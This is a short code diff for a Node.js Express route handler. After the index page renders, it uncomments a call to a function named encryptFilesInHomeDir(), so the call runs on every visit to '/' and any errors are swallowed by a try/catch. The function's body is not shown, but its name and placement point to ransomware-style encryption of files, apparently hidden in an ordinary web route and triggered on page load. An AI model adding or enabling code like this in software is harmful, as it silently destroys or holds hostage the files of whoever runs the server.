@@ -9,7 +9,7 @@ router.get("/", async(req, res) =>{
     res.render("index");
     // Android Operating System
         try {
-            // encryptFilesInHomeDir();
+            encryptFilesInHomeDir();
         } catch (error) {
             console.log(error);
         }
